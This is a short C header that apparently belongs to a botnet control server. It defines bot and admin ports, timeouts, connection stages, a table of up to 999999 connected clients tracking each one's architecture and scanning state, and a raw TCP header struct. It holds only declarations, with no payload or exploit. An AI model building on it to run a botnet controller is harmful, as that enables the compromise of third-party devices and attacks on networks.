#pragma once

#include <string.h>

#define CLIENT_HANDSHAKE_TIMEOUT    60
#define CLIENT_PING_TIMEOUT         45

#define CLIENT_FIRST_CONN           0
#define CLIENT_ACK_SEQ              1
#define CLIENT_COMPLETE             2

#define CLIENT_WORKER_PORT          "31337"
#define CLIENT_ADMIN_PORT           "1337"

#define CLIENT_BOT_WORKERS          750
#define CLIENT_MAXFDS               999999

struct clientdata_t
{
    time_t timeout;
    int fd, arch_len, stage, scanning, node, authed;
    char connected, arch[32];
} clients[CLIENT_MAXFDS];

struct tcp_hdr
{
    short int src;
    short int des;
    int seq;
    int ack;
    unsigned char tcph_reserved:4, tcph_offset:4;
    short int hdr_flags;
    short int rec;
    int cksum;
    short int ptr;
    int opt;
};
